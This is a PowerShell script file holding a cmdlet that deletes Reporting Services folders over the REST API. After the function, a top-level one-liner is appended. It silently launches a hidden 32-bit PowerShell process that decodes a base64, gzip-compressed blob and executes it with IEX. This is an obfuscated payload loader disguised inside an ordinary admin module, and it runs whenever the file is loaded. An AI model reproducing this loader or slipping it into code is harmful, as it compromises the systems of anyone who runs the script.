


function Remove-RsRestFolder
{
    

    [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'High')]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $RsFolder,

        [string]
        $ReportPortalUri,

        [Alias('ApiVersion')]
        [ValidateSet("v2.0")]
        [string]
        $RestApiVersion = "v2.0",

        [Alias('ReportServerCredentials')]
        [System.Management.Automation.PSCredential]
        $Credential,

        [Microsoft.PowerShell.Commands.WebRequestSession]
        $WebSession
    )
    Begin
    {
        $WebSession = New-RsRestSessionHelper -BoundParameters $PSBoundParameters
        $ReportPortalUri = Get-RsPortalUriHelper -WebSession $WebSession
        $foldersUri = $ReportPortalUri + "api/$RestApiVersion/Folders(Path='{0}')"
    }
    Process
    {
        if ($RsFolder -eq '/')
        {
            throw "Root folder cannot be deleted!"
        }

        if ($PSCmdlet.ShouldProcess($RsFolder, "Delete the folder"))
        {
            try
            {
                Write-Verbose "Deleting folder $RsFolder..."
                $foldersUri = [String]::Format($foldersUri, $RsFolder)

                if ($Credential -ne $null)
                {
                    Invoke-WebRequest -Uri $foldersUri -Method Delete -WebSession $WebSession -Credential $Credential -UseBasicParsing -Verbose:$false | Out-Null
                }
                else
                {
                    Invoke-WebRequest -Uri $foldersUri -Method Delete -WebSession $WebSession -UseDefaultCredentials -UseBasicParsing -Verbose:$false | Out-Null
                }

                Write-Verbose "Folder $RsFolder was deleted successfully!"
            }
            catch
            {
                throw (New-Object System.Exception("Failed to delete folder '$RsFolder': $($_.Exception.Message)", $_.Exception))
            }
        }
    }
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIV0GFgCA7VWbW/aSBD+3Er9D1aFhK0SbAht0kiVbm1jIAECcTABDlWLvTYbFi+11+Gl1/9+Y7Abck1OqU5ngby7M7Mz+8wzO/aT0BWUh9JmXllL39+9fdPDEV5KcoF+pQujU5IK815wPqufa0bjmihv3oBKIRiHrQ6XvkjyBK1WJl9iGk4vLowkikgoDvNygwgUx2Q5Y5TEsiL9JQ3nJCIn17N74grpu1T4Wm4wPsMsU9sa2J0T6QSFXiprcxenoZXtFaNCLv75Z1GZnFSm5fq3BLNYLtrbWJBl2WOsqEg/lNTh7XZF5GKHuhGPuS/KQxqeVsuDMMY+6cJuD6RDxJx7cVGBc8AvIiKJQik7UbrFQUEuwrAXcRd5XkRi0C+3wge+IHIhTBgrSX/Ik8z/TRIKuiQgFyTiK5tED9QlcbmJQ4+RG+JP5S5Z58d+rZF8bARaPREpJUjLs4F2uJcwcrAtKr+GmiVTgeefCQUcfrx7++6tnxOBR7Zpd6l7TAYYvZnsxwTClXs8pnvdL5JWkjrgFgsebWFauI0SokylSZqIyXQqFdiwG1un9rrufm2WXt6nkhuBySzxtpdn12tYnjicelMwy9JVoNXAql81de86lb5MPpP4NCTmNsRL6ub8kp9LBPEZ2Z+8nKt1ITy5mAmIZxJGAixSYEvS5Fez+pKKn7Z6QplHIuRCMmOICvKsPA3mkCu52Ao7ZAmoHeZFyIsPrCa5dsbkbe49nYNS0WA4jktSL4GyckuSTTAjXklCYUwzEUoE3w+Lj+F2Eiaoi2ORbzdVnqKZeTV4GIsocSGdgMCtvSIuxSwFpCQ1qUf0rU2D3HvxWTgMzBgNA9jpAdIBKykMtkhJEkGgTwihlG0iWssVI0vQ3Ve7xXAAtZ3Vx55dOCBe8fl48xo4ED7FJwfmKFpIus24KEkOjQRcHSnWOcf+W0BHF8hRaEZEsoTJeXVN9K1I66GwG38KG5oeGZWUvxl6e6wiAThZEV/qOCafaraIAEX5vXpNDQTPqBWyjqsvaAWtaaXVgf+Anra4eeZdXd431cjczH3UiludZs/sN5u1h0vbqQm73hJXvZbo1O/u723UvBmMxLiFmrdUW4xqu9Ul3dlt5I026qedvltr+mZ3H3j+yPT94My3byofLdoeGn1dq+K2WU/aQ32ta7W4TtfNPh30F5eWmI0chge+GtxVPmO6aUf3ToV3di2EGvNTd3fpO415x9uOmurnYW2B6ggZYd2xdH410iPUUx0cOHx9FehxNTCQbrmUjPsDS+/3LR0NGvffzM9qALZ3eK4PnSodr+5u5jC3IIQrVau1PLLjoz6A1OAIBzegExhVd+6DjvkB6R+6PK7ihc6RDjrW+BvENVpZPQby20GVI4d17zBqj7eWqlZGvRpqanTYCFC6JQ70Pkbxg7kz1YrjcW/4sTvyVeeOnammcbtyfVVV103zyh1XNufXZ+ftIXWWHA1U1XmfcgRIUgjdO2s2O8r4S9d/B0fxHDNgAtzqea1aPLKy27nHaWohy/t2vSBRSBg0OGiBObkRY9xNO8XPexw61aF/TKFeBzA8rT47UqSfispjD8mXLi7GECmUyyODy20SBmJe0janmgaNQNvUNDjx689o8NVWPtqwlLaTDKynntjek5KWUmF5kzygna5tsfP/IprV8Rxe3msQfVz7F+mrUNZKOQq/CJ4u/Bbcvw3AEFMBmjZcRIwc2ubLOGQkOvr6OEoUcMTPnvRD8DoRJ134NvkbGiiTnH4KAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

